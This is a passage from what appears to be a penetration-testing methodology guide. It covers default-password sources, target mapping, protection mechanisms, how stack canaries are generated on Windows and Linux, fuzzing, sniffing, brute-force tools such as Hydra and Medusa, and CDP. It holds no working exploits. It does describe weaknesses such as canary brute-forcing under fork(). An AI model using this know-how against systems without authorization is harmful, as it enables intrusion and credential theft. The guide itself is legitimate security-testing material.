<li>Packetstorm - <a class="reference external" href="http://www.packetstorm.com">http://www.packetstorm.com</a></li>
<li>Security Reason - <a class="reference external" href="http://www.securityreason.com">http://www.securityreason.com</a></li>
<li>Black Asylum - <a class="reference external" href="http://www.blackasylum.com/?p=160">http://www.blackasylum.com/?p=160</a></li>
</ul>
<div class="section" id="common-default-passwords">
<h5>Common/default passwords<a class="headerlink" href="#common-default-passwords" title="Permalink to this headline">¶</a></h5>
<div class="line-block">
<div class="line">Attempt to identify if a device, application, or operating system is
vulnerable to a default credential attack is really as simple as
trying to enter in known default passwords. Default passwords can be
obtained from the following websites:</div>
<div class="line">* <a class="reference external" href="http://www.phenoelit-us.org/dpl/dpl.html">http://www.phenoelit-us.org/dpl/dpl.html</a></div>
</div>
<ul class="simple">
<li><a class="reference external" href="http://cirt.net/passwords">http://cirt.net/passwords</a></li>
<li><a class="reference external" href="http://www.defaultpassword.com">http://www.defaultpassword.com</a></li>
<li><a class="reference external" href="http://www.passwordsdatabase.com">http://www.passwordsdatabase.com</a></li>
<li><a class="reference external" href="http://www.isdpodcast.com/resources/62k-common-passwords/">http://www.isdpodcast.com/resources/62k-common-passwords/</a></li>
</ul>
</div>
</div>
<div class="section" id="establish-target-list">
<h4>Establish target list<a class="headerlink" href="#establish-target-list" title="Permalink to this headline">¶</a></h4>
<p>Identifying all potential targets is critical to penetration testing.
Properly established target lists ensure that attacks are properly
targeted. If the particular versions of software running in the
environment can be identified, the tester is dealing with a known
quantity, and can even replicate the environment. A properly defined
target list should include a mapping of OS version, patch level
information. If known it should include web application weaknesses,
lockout thresholds and weak ports for attack.</p>
<div class="section" id="mapping-versions">
<h5>Mapping Versions<a class="headerlink" href="#mapping-versions" title="Permalink to this headline">¶</a></h5>
<p>Version checking is a quick way to identify application information. To
some extent, versions of services can be fingerprinted using nmap, and
versions of web applications can often be gathered by looking at the
source of an arbitrary page.</p>
</div>
<div class="section" id="identifying-patch-levels">
<h5>Identifying Patch Levels<a class="headerlink" href="#identifying-patch-levels" title="Permalink to this headline">¶</a></h5>
<p>To identify the patch level of services internally, consider using
software which will interrogate the system for differences between
versions. Credentials may be used for this phase of the penetration
test, provided the client has acquiesced. Vulnerability scanners are
particularly effective at identifying patch levels remotely, without
credentials.</p>
</div>
<div class="section" id="looking-for-weak-web-applications">
<h5>Looking for Weak Web Applications<a class="headerlink" href="#looking-for-weak-web-applications" title="Permalink to this headline">¶</a></h5>
<p>Identifying weak web applications can be a particularly fruitful
activity during a penetration test. Things to look for include OTS
applications that have been misconfigured, OTS application which have
plugin functionality (plugins often contain more vulnerable code than
the base application), and custom applications. Web application
fingerprinters such as WAFP can be used here to great effect.</p>
</div>
<div class="section" id="identify-weak-ports-and-services">
<h5>Identify Weak Ports and Services<a class="headerlink" href="#identify-weak-ports-and-services" title="Permalink to this headline">¶</a></h5>
<p>Identifying weak ports can be done using banner grabbing, nmap and
common sense. Many ports and services will lie, or mislead about the
specifics of their version.</p>
</div>
<div class="section" id="identify-lockout-threshold">
<h5>Identify Lockout threshold<a class="headerlink" href="#identify-lockout-threshold" title="Permalink to this headline">¶</a></h5>
<p>Identifying the lockout threshold of an authentication service will
allow you to ensure that your bruteforce attacks do not intentionally
lock out valid users during your testing. Identify all disparate
authentication services in the environment, and test a single, innocuous
account for lockout. Often 5 - 10 tries of a valid account is enough to
determine if the service will lock users out.</p>
</div>
</div>
</div>
<div class="section" id="attack-avenues">
<h3>Attack Avenues<a class="headerlink" href="#attack-avenues" title="Permalink to this headline">¶</a></h3>
<p>Attack avenues focus on identifying all potential attack vectors that
could be leveraged against a target. This is much more detailed than
simply looking at the open or filtered ports, but evaluates the
Footprinting information and automated results in an effort to create an
attack tree.</p>
<div class="section" id="creation-of-attack-trees">
<h4>Creation of Attack Trees<a class="headerlink" href="#creation-of-attack-trees" title="Permalink to this headline">¶</a></h4>
<p>Attack trees are conceptual diagrams of threats on target systems and
should include all possible attack methods to reach those threats.</p>
</div>
<div class="section" id="identify-protection-mechanisms">
<h4>Identify protection mechanisms<a class="headerlink" href="#identify-protection-mechanisms" title="Permalink to this headline">¶</a></h4>
<p>There is no magic bullet for detecting and subverting Network or Host
based protection mechanisms. It takes skill and experience. This is
beyond the scope of this document, which only lists the relevant
protection mechanisms and describes what they do.</p>
<div class="section" id="network-protections">
<h5>Network protections<a class="headerlink" href="#network-protections" title="Permalink to this headline">¶</a></h5>
<p>&#8220;Simple&#8221; Packet Filters</p>
<p>Packet filters are rules for classifying packets based on their header
fields. Packet classification is essential to routers supporting
services such as quality of service (QoS), virtual private networks
(VPNs), and firewalls.</p>
<p>Traffic shaping devices</p>
<p>Traffic shaping is the control of computer network traffic in order to
optimize or guarantee performance, improve latency, and/or increase
usable bandwidth for some kinds of packets by delaying other kinds of
packets that meet certain criteria. During penetration test traffic
shaping can also control the volume of traffic being sent into a network
in a specified period, or the maximum rate at which the traffic is sent.
For these reasons; traffic shaping is important to detect at the network
edges to avoid packet dropping and packet marking.</p>
<p>Data Loss Prevention (DLP) systems</p>
<p>Data Loss Prevention (DLP) refers to systems that identify, monitor, and
protect data in use, data in motion, and data at rest via content
inspection and contextual analysis of activities (attributes of
originator, data object, medium, timing, recipient/destination and so
on). DLP systems are analogous to intrusion-prevention system for data.</p>
</div>
<div class="section" id="host-based-protections">
<h5>Host based protections<a class="headerlink" href="#host-based-protections" title="Permalink to this headline">¶</a></h5>
<p>Host-based protections usually revolve around an installed software
package which monitors a single host for suspicious activity by
analyzing events occurring within that host. The majority of Host-based
protections utilize one of three detection methods: signature-based,
statistical anomaly-based and stateful protocol analysis.</p>
<p>Stack/heap protections</p>
<p>Numerous tools are available that can monitor the host to provide
protections against buffer overflows. Microsoft&#8217;s Data Execution
Prevention mode is an example that is designed to explicitly protect the
pointer to the SEH Exception Handler from being overwritten.</p>
<p>Whitelisting</p>
<p>Whitelisting provides a list of entities that are being provided a
particular privilege, service, mobility, access, or recognition. An
emerging approach in combating attacks by viruses and malware is to
whitelist software which is considered safe to run, blocking all others</p>
<p>AV/Filtering/Behavioral Analysis</p>
<p>Behavioral analysis works from a set of rules that define a program as
either legitimate, or malicious. Behavioral analysis technology monitors
what an application or piece of code does and attempts to restrict its
action. Examples of this might include applications trying to write to
certain parts of a system registry, or writing to pre-defined folders.
These and other actions would be blocked, with the actions notified to
the user or administrator.</p>
</div>
<div class="section" id="application-level-protections">
<h5>Application level protections<a class="headerlink" href="#application-level-protections" title="Permalink to this headline">¶</a></h5>
</div>
</div>
</div>
</div>
<div class="section" id="exploitation">
<h2>Exploitation<a class="headerlink" href="#exploitation" title="Permalink to this headline">¶</a></h2>
<div class="section" id="precision-strike">
<h3>Precision strike<a class="headerlink" href="#precision-strike" title="Permalink to this headline">¶</a></h3>
<p>Additional information on exploitation can be found at the <a class="reference external" href="http://www.offensive-security.com/metasploit-unleashed/Exploit_Development">Metasploit
Unleashed</a>
course.</p>
<div class="section" id="countermeasure-bypass">
<h4>Countermeasure Bypass<a class="headerlink" href="#countermeasure-bypass" title="Permalink to this headline">¶</a></h4>
<p>&lt;Contribution Needed&gt;</p>
<div class="section" id="av">
<h5>AV<a class="headerlink" href="#av" title="Permalink to this headline">¶</a></h5>
<p>&lt;Contribution Needed&gt;</p>
<ul class="simple">
<li>Encoding</li>
<li>Packing</li>
<li>Whitelist Bypass</li>
<li>Process Injection</li>
<li>Purely Memory Resident</li>
</ul>
</div>
<div class="section" id="human">
<h5>Human<a class="headerlink" href="#human" title="Permalink to this headline">¶</a></h5>
<p>&lt;Contribution Needed&gt;</p>
</div>
<div class="section" id="hips">
<h5>HIPS<a class="headerlink" href="#hips" title="Permalink to this headline">¶</a></h5>
<p>&lt;Contribution Needed&gt;</p>
</div>
<div class="section" id="dep">
<h5>DEP<a class="headerlink" href="#dep" title="Permalink to this headline">¶</a></h5>
<p>&lt;Contribution Needed&gt;</p>
</div>
<div class="section" id="aslr">
<h5>ASLR<a class="headerlink" href="#aslr" title="Permalink to this headline">¶</a></h5>
<p>&lt;Contribution Needed&gt;</p>
</div>
<div class="section" id="va-nx-linux">
<h5>VA + NX (Linux)<a class="headerlink" href="#va-nx-linux" title="Permalink to this headline">¶</a></h5>
<p>&lt;Contribution Needed&gt;</p>
</div>
<div class="section" id="w-x-openbsd">
<h5>w^x (OpenBSD)<a class="headerlink" href="#w-x-openbsd" title="Permalink to this headline">¶</a></h5>
<p>&lt;Contribution Needed&gt;</p>
</div>
<div class="section" id="waf">
<h5>WAF<a class="headerlink" href="#waf" title="Permalink to this headline">¶</a></h5>
<p>A WAF (Web application firewall) is a firewall which can be installed in
front of (network topology speaking) a web application. The WAF will
analyze each request and look for common web attacks such as Cross Site
Scripting and SQLinjection. Like most AV scanners, a blacklisting
mechanism is often used to find these potentially malicious HTTP
requests (often regex). Since these WAFs are using this blacklisting
technique, multiple papers exist on bypassing these types of devices.</p>
</div>
<div class="section" id="stack-canaries">
<h5>Stack Canaries<a class="headerlink" href="#stack-canaries" title="Permalink to this headline">¶</a></h5>
<p>In order to understand the use of the Stack Canaries, one needs to
understand the fundamental flaw of buffer overflows. A buffer overflow
happens when an application fails to properly verify the length of the
input received with the length of the buffer in memory to which this
data is copied. Due to the way the stack is build, and the way the data
is entered on the stack, the input received could be used to overwrite
the EIP (extended instruction pointer, this is used by the application
to know where the application came from prior to copying the input to
the buffer). When an attacker controls the EIP, the execution of the
application can be altered in such a way that the attacker has full
control of the application. A potential fix is by adding a &#8220;cookie&#8221; or
stack canary right after the buffer on the stack. When the application
wants to return, the value of the stack canary is verified. If this
value has been altered, the program will ignore the EIP and crash
therefore making the buffer overflow ineffective.</p>
<p>Every operating system calculates a different cookie.</p>
<p>Microsoft Windows</p>
<p>The cookie in Windows is added by Visual Studio. One of the options when
compiling an application is /GS. The option is enabled by default. The
cookie is calculated using a few process specific variables. Below is a
representative code of how this cookie is calculated.</p>
<div class="line-block">
<div class="line"><a href="#id10"><span class="problematic" id="id11">``</span></a><a href="#id12"><span class="problematic" id="id13">``</span></a></div>
<div class="line"><code class="docutils literal"><span class="pre">void&nbsp;generate_security_cookie()&nbsp;{</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;defaultval1&nbsp;=&nbsp;0xFFFF0000;</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;defaultval2&nbsp;=&nbsp;0xBB40E64E;&nbsp;//&nbsp;Hex&nbsp;value&nbsp;of&nbsp;PI&nbsp;without&nbsp;comma...</span></code></div>
<div class="line"><a href="#id14"><span class="problematic" id="id15">``</span></a><a href="#id16"><span class="problematic" id="id17">``</span></a></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;result&nbsp;=&nbsp;0;</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;resultcomp&nbsp;=&nbsp;0;</span></code></div>
<div class="line"><a href="#id18"><span class="problematic" id="id19">``</span></a><a href="#id20"><span class="problematic" id="id21">``</span></a></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;FILETIME&nbsp;filetimestruct&nbsp;;</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;GetSystemTimeAsFileTime(&amp;filetimestruct);</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;LARGE_INTEGER&nbsp;perfcounter;</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;QueryPerformanceCounter(&amp;perfcounter);</span></code></div>
<div class="line"><a href="#id22"><span class="problematic" id="id23">``</span></a><a href="#id24"><span class="problematic" id="id25">``</span></a></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;tickc&nbsp;=&nbsp;GetTickCount();</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;threadid&nbsp;=&nbsp;GetCurrentThreadId();</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;processid&nbsp;=&nbsp;GetCurrentProcessId();</span></code></div>
<div class="line"><a href="#id26"><span class="problematic" id="id27">``</span></a><a href="#id28"><span class="problematic" id="id29">``</span></a></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;result&nbsp;^&nbsp;filetimestruct.dwHighDateTime;</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;result&nbsp;^&nbsp;filetimestruct.dwLowDateTime;</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;result&nbsp;^&nbsp;threadid;</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;result&nbsp;^&nbsp;processid;</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;result&nbsp;^&nbsp;tickc;</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;result&nbsp;^&nbsp;perfcounter.HighPart;</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;result&nbsp;^&nbsp;perfcounter.LowPart;</span></code></div>
<div class="line"><a href="#id30"><span class="problematic" id="id31">``</span></a><a href="#id32"><span class="problematic" id="id33">``</span></a></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(result&nbsp;==&nbsp;defaultval2)&nbsp;{</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Wow,&nbsp;what&nbsp;are&nbsp;they&nbsp;odd&nbsp;of&nbsp;getting&nbsp;the&nbsp;same&nbsp;value&nbsp;as&nbsp;the&nbsp;beginning&quot;);</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;0xBB40E64E;</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!(result&nbsp;&amp;&nbsp;defaultval1))&nbsp;{</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;temp&nbsp;=&nbsp;(result&nbsp;|&nbsp;0x4711)&nbsp;&lt;&lt;&nbsp;16;</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;|=&nbsp;temp;</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;}</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;resultcomp&nbsp;=&nbsp;~result;&nbsp;&nbsp;&nbsp;</span></code></div>
</div>
<p>As you can see, some of these values are not hard to figure out. Except
for maybe the LowDateTime and the performance counter. An excellent
paper has been written concerning this lack of entropy. More information
can be found in that paper here (<a class="reference external" href="http://j00ru.vexillium.org/?p=690">Exploiting the otherwise
non-exploitable</a>)</p>
<p>Linux</p>
<p>As in Windows, the somewhat default compiler, gcc, adds the code for the
stack canarie. This code can be found in the file libssp/ssp.c</p>
<div class="line-block">
<div class="line"><a href="#id34"><span class="problematic" id="id35">``</span></a><a href="#id36"><span class="problematic" id="id37">``</span></a></div>
<div class="line"><code class="docutils literal"><span class="pre">static&nbsp;void&nbsp;__attribute__&nbsp;((constructor))</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">__guard_setup&nbsp;(void)</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">{</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;unsigned&nbsp;char&nbsp;*p;</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;int&nbsp;fd;</span></code></div>
<div class="line"><a href="#id38"><span class="problematic" id="id39">``</span></a><a href="#id40"><span class="problematic" id="id41">``</span></a></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;if&nbsp;(__stack_chk_guard&nbsp;!=&nbsp;0)</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;return;</span></code></div>
<div class="line"><a href="#id42"><span class="problematic" id="id43">``</span></a><a href="#id44"><span class="problematic" id="id45">``</span></a></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;fd&nbsp;=&nbsp;open&nbsp;(&quot;/dev/urandom&quot;,&nbsp;O_RDONLY);</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;if&nbsp;(fd&nbsp;!=&nbsp;-1)</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;{</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ssize_t&nbsp;size&nbsp;=&nbsp;read&nbsp;(fd,&nbsp;&amp;__stack_chk_guard,</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sizeof&nbsp;(__stack_chk_guard));</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;close&nbsp;(fd);</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(size&nbsp;==&nbsp;sizeof(__stack_chk_guard)&nbsp;&amp;&amp;&nbsp;__stack_chk_guard&nbsp;!=&nbsp;0)</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;}</span></code></div>
<div class="line"><a href="#id46"><span class="problematic" id="id47">``</span></a><a href="#id48"><span class="problematic" id="id49">``</span></a></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;/*&nbsp;If&nbsp;a&nbsp;random&nbsp;generator&nbsp;can't&nbsp;be&nbsp;used,&nbsp;the&nbsp;protector&nbsp;switches&nbsp;the&nbsp;guard</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;to&nbsp;the&nbsp;&quot;terminator&nbsp;canary&quot;.&nbsp;&nbsp;*/</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;p&nbsp;=&nbsp;(unsigned&nbsp;char&nbsp;*)&nbsp;&amp;__stack_chk_guard;</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;p[sizeof(__stack_chk_guard)-1]&nbsp;=&nbsp;255;</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;p[sizeof(__stack_chk_guard)-2]&nbsp;=&nbsp;'\n';</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;p[0]&nbsp;=&nbsp;0;</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">}</span></code></div>
</div>
<p>It is known that some older versions of gcc do not use the urandom
device in order to create a new cookie. They use a preset cookie value
(a mix of unprintable characters such as 00 0A 0D and FF). Gcc will
compile an application with stack canaries by default.</p>
<p>Problems with the implementation on Linux: On a linux machine, there are
a few different ways of creating a thread. One of them is called fork().
When using fork to create a new thread, the application will &#8220;quickly&#8221;
create a new thread which will reuse the calculated cookie for each new
&#8220;fork&#8221;-ed thread. If a buffer overflow would exist in this forked
thread, an attacker could bruteforce the stack canarie. Once again a
great article describing this attack can be found here (<a class="reference external" href="http://www.phrack.org/issues.html?issue=67&amp;id=13">Scraps of notes
on remote stack overflow
exploitation</a>)</p>
<p>MAC OS</p>
<p>Disabled by default. Contribution required.</p>
</div>
</div>
</div>
<div class="section" id="customized-exploitation">
<h3>Customized Exploitation<a class="headerlink" href="#customized-exploitation" title="Permalink to this headline">¶</a></h3>
<p>Fuzzing is the process of attempting to discover security
vulnerabilities by sending random input to an application. If the
program contains a vulnerability that can leads to an exception, crash
or server error (in the case of web apps), it can be determined that a
vulnerability has been discovered. Fuzzers are generally good at finding
buffer overflow, DoS, SQL Injection, XSS, and Format String bugs.
Fuzzing falls into two categories: Dumb Fuzzing and Intelligent Fuzzing.</p>
<p>Dumb Fuzzing usually consists of simple modifications to legitimate
data, that is then fed to the target application. In this case, the
fuzzer is very easy to write and the idea is to identify low hanging
fruit. Although not an elegant approach, dumb fuzzing can produce
results, especially when a target application has not been previously
tested. FileFuzz is an example of a Dumb Fuzzer. FileFuzz is a Windows
based file format fuzzing tool that was designed to automate the
launching of applications and detection of exceptions caused by fuzzed
file formats.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_131.png">Screenshot Here</a></p>
<p>Intelligent Fuzzers are ones that are generally aware of the protocol or
format of the data being tested. Some protocols require that the fuzzer
maintain state information, such as HTTP or SIP. Other protocols will
make use of authentication before a vulnerability is identified. Apart
from providing much more code coverage, intelligent fuzzers tend to cut
down the fuzzing time significantly since they avoid sending data that
the target application will not understand. Intelligent fuzzers are
therefore much more targeted and sometimes they need to be developed by
the security researcher.</p>
<div class="section" id="sniffing">
<h4>Sniffing<a class="headerlink" href="#sniffing" title="Permalink to this headline">¶</a></h4>
<p>A packet analyzer is used to intercept and log traffic passing over the
network. It is considered best practice to utilize a sniffer when
performing exploitation. This ensures that all relevant traffic is
captured for further analysis. This is also extremely useful for
extracting cleartext passwords.</p>
<div class="section" id="id50">
<h5>Wireshark<a class="headerlink" href="#id50" title="Permalink to this headline">¶</a></h5>
<p>Wireshark is a free and open-source packet analyzer. It is used for
network troubleshooting, analysis, software and communications protocol
development, and education. Originally named Ethereal, in May 2006 the
project was renamed Wireshark due to trademark issues.</p>
<p>Wireshark is cross-platform, using the GTK+ widget toolkit to implement
its user interface, and using pcap to capture packets; it runs on
various Unix-like operating systems including Linux, Mac OS X, BSD, and
Solaris, and on Microsoft Windows.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_132.png">Screenshot Here</a></p>
</div>
<div class="section" id="id51">
<h5>Tcpdump<a class="headerlink" href="#id51" title="Permalink to this headline">¶</a></h5>
<p>Tcpdump is a common packet analyzer that runs under the command line. It
allows the user to intercept and display TCP/IP and other packets being
transmitted or received over a network to which the computer is
attached. Tcpdump works on most Unix-like operating systems: Linux,
Solaris, BSD, Mac OS X, HP-UX and AIX among others. In those systems,
tcpdump uses the libpcap library to capture packets.</p>
<p>There is also a port of tcpdump for Windows called WinDump; this uses
WinPcap, which is a port of libpcap to Windows.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_133.png">Screenshot Here</a></p>
</div>
</div>
<div class="section" id="brute-force">
<h4>Brute-Force<a class="headerlink" href="#brute-force" title="Permalink to this headline">¶</a></h4>
<p>A brute force attack is a strategy that can in theory be used by an
attacker who is unable to take advantage of any weakness in a system. It
involves systematically checking all possible usernames and passwords
until the correct one is found.</p>
<div class="section" id="brutus-windows">
<h5>Brutus (Windows)<a class="headerlink" href="#brutus-windows" title="Permalink to this headline">¶</a></h5>
<p>Brutus is a generic password guessing tool that comes with built-in
routines for attacking</p>
<p>HTTP Basic and Forms-based authentication, among other protocols like
SMTP and</p>
<p>POP3. Brutus can perform both &#8216;&#8217;dictionary &#8216;&#8217;and randomly generated
attacks from a given character set.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_134.png">Screenshot Here</a></p>
</div>
<div class="section" id="web-brute-windows">
<h5>Web Brute (Windows)<a class="headerlink" href="#web-brute-windows" title="Permalink to this headline">¶</a></h5>
<p>Web Brute is included with HP WebInspect and is the primary means of
attacking a login form or authentication page, using prepared lists of
user names and passwords.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_135.png">Screenshot Here</a></p>
</div>
<div class="section" id="thc-hydra-xhydra">
<h5>THC-Hydra/XHydra<a class="headerlink" href="#thc-hydra-xhydra" title="Permalink to this headline">¶</a></h5>
<p>THC-Hydra (or just Hydra) is a network logon bruteforcer which supports
attacking many different services such as FTP, HTTP, HTTPS, ICQ, IRC,
IMAP, LDAP, MS-SQL, MySQL, NCP, NNTP, Oracle, POP3, pcAnywhere,
PostgreSQL, REXEC, RDP, RLOGIN, RSH, SAP R/3, SIP, SMB, SMTP, SNMP,
SOCKS, SSH, Subversion (SVN), TeamSpeak, Telnet, VNC, VMware Auth
Daemon, and XMPP. It is available in both a command line and GUI
version.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_136.png">Screenshot Here</a></p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_137.png">Screenshot Here</a></p>
</div>
<div class="section" id="medusa">
<h5>Medusa<a class="headerlink" href="#medusa" title="Permalink to this headline">¶</a></h5>
<p>Medus is another network logon bruteforcer which supports attacking many
different services such as AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL,
NCP, NNTP, Oracle, POP3, pcAnywhere, PostgreSQL, REXEC, RDP, RLOGIN,
RSH, SMB, SMTP, SNMP, SOCKS, SSH, Subversion (SVN), Telnet, VNC, and
VMware Auth Daemon. It is only available in a command line version.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_138.png">Screenshot Here</a></p>
</div>
<div class="section" id="ncrack">
<h5>Ncrack<a class="headerlink" href="#ncrack" title="Permalink to this headline">¶</a></h5>
<p>Ncrack is another network logon bruteforcer which supports attacking
many different services such as RDP, SSH, http(s), SMB, pop3(s), FTP,
and telnet. Ncrack was designed using a modular approach, a command-line
syntax similar to Nmap and a dynamic engine that can adapt its behavior
based on network feedback.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_139.png">Screenshot Here</a></p>
</div>
</div>
<div class="section" id="routing-protocols">
<h4>Routing protocols<a class="headerlink" href="#routing-protocols" title="Permalink to this headline">¶</a></h4>
<p>Routing protocols specify how routers communicate with each other,
disseminating information that enables them to select routes between any
two nodes on a computer network, the choice of the route being done by
routing algorithms. Each router has a priori knowledge only of networks
attached to it directly. A routing protocol shares this information
first among immediate neighbors, and then throughout the network. This
way, routers gain knowledge of the topology of the network.</p>
</div>
<div class="section" id="cisco-discovery-protocol-cdp">
<h4>Cisco Discovery Protocol (CDP)<a class="headerlink" href="#cisco-discovery-protocol-cdp" title="Permalink to this headline">¶</a></h4>
<p>The Cisco Discovery Protocol (CDP) is a proprietary Data Link Layer
network protocol developed by Cisco Systems that is implemented in most
Cisco networking equipment. It is used to share information about other
directly connected Cisco equipment, such as the operating system version
and IP address. CDP can also be used for On-Demand Routing, which is a
method of including routing information in CDP announcements so that
dynamic routing protocols do not need to be used in simple networks.</p>
<p>Cisco devices send CDP announcements to the multicast destination
address 01:00:0C:CC:CC:CC, out each connected network interface. These
multicast packets may be received by Cisco switches and other networking
devices that support CDP into their connected network interface. This
multicast destination is also used in other Cisco protocols such as VTP.
By default, CDP announcements are sent every 60 seconds on interfaces
that support Subnetwork Access Protocol (SNAP) headers, including
Ethernet, Frame Relay, and Asynchronous Transfer Mode (ATM). Each Cisco
device that supports CDP stores the information received from other
devices in a table that can be viewed using the show cdp neighbors
command. This table is also accessible via snmp. The CDP table
information is refreshed each time an announcement is received, and the
holdtime for that entry is reinitialized. The holdtime specifies the
lifetime of an entry in the table - if no announcements are received
from a device for a period in excess of the holdtime, the device
information is discarded (default 180 seconds).</p>
<p>The information contained in CDP announcements varies by the type of
device and the version of the operating system running on it. This
information may include the operating system version, hostname, every
address (i.e. IP address) from all protocol(s) configured on the port
where CDP frame is sent, the port identifier from which the announcement
was sent, device type and model, duplex setting, VTP domain, native
VLAN, power draw (for Power over Ethernet devices), and other device
specific information. The details contained in these announcements are
easily extended due to the use of the type-length-value (TLV) frame
format. The tool for attacking CDP is Yersinia.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_140.png">Screenshot Here</a></p>
</div>
